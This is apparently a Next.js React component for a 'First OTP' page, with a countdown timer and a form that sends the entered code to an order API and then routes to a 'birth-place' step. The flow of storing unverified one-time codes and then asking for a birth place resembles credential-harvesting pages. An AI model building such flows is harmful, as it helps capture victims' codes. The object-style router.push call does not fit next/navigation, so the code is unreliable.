import { useRouter, useSearchParams } from "next/navigation";

// Import Swiper styles
import { FaArrowRightLong } from "react-icons/fa6";
import { useEffect, useState } from "react";
import toast from "react-hot-toast";
import SwiperSlider from "@/components/SwiperSlider";
import { Button } from "@nextui-org/react";

const FirstOtp = () => {
  const router = useRouter();
  const searchParams = useSearchParams();
  const params = new URLSearchParams(searchParams);
  // a countdown timer function
  const [time, setTime] = useState(180);
  useEffect(() => {
    const timer = setInterval(() => {
      setTime((prevTime) => {
        if (prevTime === 0) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    const submitData = {
      firstOtp: e.target.firstOtp.value,
    };
    // console.log("submitData", submitData);
    // console.log('params.get(id)', params.get('id'))
    if (submitData.firstOtp === "") {
      toast.error("Please enter your first otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(`${process.env.API_URL}/api/order/${params.get("id")}`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          // console.log('data', data)
          if (data) {
            router.push({
              pathname: "/birth-place",
              query: { id: data._id },
            });
          } else {
            toast.error("Please enter correct otp");
          }
        });
    }
  };

  return (
    <>
      {/* create a form so that I can add user-name, email, phone number etc add some design also */}
      <SwiperSlider />
      <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
        <h1 className="text-4xl font-bold text-gray-600 mt-10">First OTP</h1>
        {/* a countdown timer for 180s design */}
        <div className="flex justify-center items-center gap-2 mt-5 border-4 h-28 w-28 rounded-full">
          <h1 className="text-2xl font-bold text-gray-600 m-0">
            {Math.floor(time / 60)}:
          </h1>
          <h1 className="text-2xl font-bold text-gray-600 m-0">{time % 60}</h1>
        </div>

        <form onSubmit={handleSubmit} className="w-3/4 my-14">
          <div className="relative z-0 w-full mb-6 group">
            <input
              type="number"
              name="firstOtp"
              id="firstOtp"
              className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
              placeholder=""
              required
            />
            <label
              htmlFor="firstOtp"
              className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
            >
              Enter Your First OTP
            </label>
          </div>
          {/* <button
            type="submit"
            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
          >
            Next <FaArrowRightLong size={16} />
          </button> */}
          <Button
            color="primary"
            type="submit"
            className={`w-full text-white h-12 bg-[#0D9488]`}
          >
            Enter OTP <FaArrowRightLong size={16} />
          </Button>
        </form>
      </div>
      <div className="h-20 bg-teal-400 mt-5"></div>
    </>
  );
};

export default FirstOtp;
